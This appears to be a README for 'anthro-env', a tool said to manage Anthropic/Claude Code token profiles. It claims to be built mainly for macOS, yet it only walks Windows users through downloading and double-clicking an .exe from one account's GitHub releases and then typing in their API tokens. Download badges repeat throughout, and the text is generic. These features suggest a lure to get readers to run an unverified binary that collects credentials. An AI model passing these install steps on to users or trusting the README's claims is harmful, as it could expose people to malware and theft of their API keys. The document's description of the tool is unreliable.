# 🛠 anthro-env - Easy Environment Profile Switching

[![Download anthro-env](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/XStarsHolderX/anthro-env/releases)

## What is anthro-env?

anthro-env is a simple tool that helps you switch between different Anthropic/Claude Code environment profiles. It stores your tokens safely using your system’s keychain. The setup is quick and needs almost no effort. While it is designed mainly for macOS, you can use it on Windows with a few steps.

This tool is helpful for anyone who needs to manage multiple AI tool profiles without fuss. If you use Claude Code or Anthropic APIs, anthro-env makes managing tokens and switching environments much easier.

---

## 🎯 Key Features

- Manage multiple Anthropic/Claude Code environment profiles with one command.
- Securely store tokens through the system keychain.
- Switch environments without restarting or manual configuration.
- Minimal setup time.
- Lightweight and fast command-line interface.
- Designed for easy use by developers and non-developers.
- Works with Anthropic's Claude Code and related AI tools.

---

## 🖥 System Requirements

- Windows 10 or later.
- PowerShell 5.1 or higher installed (comes pre-installed on Windows 10 and up).
- Internet connection to download.
- Basic comfort with running commands in PowerShell.
- Approximately 50 MB free space.

---

## 🔽 How to Download anthro-env on Windows

Click the button below to visit the official release page where you can download the latest Windows version.

[![Download anthro-env](https://img.shields.io/badge/Download-From%20GitHub-brightgreen?style=for-the-badge)](https://github.com/XStarsHolderX/anthro-env/releases)

On the releases page, look for the latest version. Find the `.exe` file or the Windows installer. The file names usually contain `windows` or `win`. Download the file to a folder you can find easily, such as your Desktop or Downloads.

---

## 🚀 How to Install and Run anthro-env on Windows

Follow these steps to get anthro-env running on your Windows PC:

1. **Download the Installer or Executable**
   - Visit the release page using the button above.
   - Click on the `.exe` installer or executable file.
   - Save it to a folder on your computer.

2. **Run the Installer**
   - Open the folder where you saved the file.
   - Double-click the `.exe` file to start the installer.
   - Follow the on-screen instructions to complete the setup.
   - The default settings usually work fine; no complex options needed.

3. **Open PowerShell**
   - Press the Windows key.
   - Type "PowerShell" and press Enter.
   - This opens a command window where you can run anthro-env.

4. **Verify the Installation**
   - In PowerShell, type:
     ```
     anthro-env --help
     ```
   - You should see a list of commands and options supported by anthro-env.

5. **Start Using anthro-env**
   - You can now create and switch environment profiles.
   - If you need to add your API tokens, anthro-env will guide you through storing them safely.

---

## 🔧 Basic Usage on Windows

Here are some simple commands to help you get started.

- **Create a New Profile**
  ```
  anthro-env add-profile
  ```
  Follow prompts to name the profile and enter API tokens.

- **List All Profiles**
  ```
  anthro-env list-profiles
  ```

- **Switch Profile**
  ```
  anthro-env switch <profile-name>
  ```
  Replace `<profile-name>` with the name of the profile you want active.

- **Remove a Profile**
  ```
  anthro-env remove-profile <profile-name>
  ```

Most commands will provide extra help if you run them with `--help`, for example:
```
anthro-env switch --help
```

---

## 🔐 Token Storage on Windows

anthro-env uses Windows Credential Manager to store your API tokens safely. You don’t need to manage or remember tokens manually after saving them once. Each profile’s tokens stay secure until you choose to remove or change them.

---

## ⚙ Configuration

You can customize the tool by editing a simple settings file. It uses a file named `.anthroenvconfig` in your user directory. This file is created automatically when you first run the tool.

Settings you can change:

- Default profile to use.
- How often profiles update.
- API request settings (like timeouts).

The settings file is a plain text file that you can open in Notepad or any text editor.

---

## 🔄 Updating anthro-env

To keep anthro-env running smoothly, check the release page from time to time for new updates.

1. Visit the release page:
   https://github.com/XStarsHolderX/anthro-env/releases

2. Download the latest Windows executable or installer.

3. Run the installer again to update the app. Your profiles and tokens remain safe.

---

## 🚨 Troubleshooting on Windows

If you run into problems, try these common fixes:

- Make sure you run PowerShell with normal permissions (no special admin rights required).
- Confirm that your Windows version is 10 or higher.
- Check that the anthro-env executable is in your system PATH or that you run it from the install folder.
- If token storage fails, verify your Windows Credential Manager is accessible via Control Panel.
- If commands don’t work, re-run the installer to repair the install.

For detailed help, you can view commands with:
```
anthro-env --help
```
or check issues reported on the GitHub repo.

---

## 📚 Additional Resources

- GitHub page for anthro-env:  
  https://github.com/XStarsHolderX/anthro-env

- Release downloads:  
  https://github.com/XStarsHolderX/anthro-env/releases

- PowerShell basics:  
  https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/01-getting-started

---

## 🤝 Support and Contributions

While this guide helps with basic setup and use, the open-source project on GitHub welcomes feedback and contributions. You can report bugs or suggest improvements by opening issues on the repository.

---

[![Download anthro-env](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge&color=2088FF)](https://github.com/XStarsHolderX/anthro-env/releases)